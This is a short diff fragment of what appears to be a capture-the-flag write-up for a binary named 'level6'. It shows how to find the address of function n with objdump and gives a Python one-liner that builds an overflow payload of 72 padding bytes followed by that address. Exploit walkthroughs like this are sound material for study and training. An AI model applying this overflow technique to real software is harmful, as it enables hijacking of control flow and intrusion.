@@ -13,4 +13,3 @@ to get the adress of n just objdump -d ./level6 | grep "<n>"
 
  => 72 bytes: 64 bytes of buffer + 8 metadata 
  python -c 'import struct; print "A" * 72 + struct.pack("<I", adress_of_n)'
-
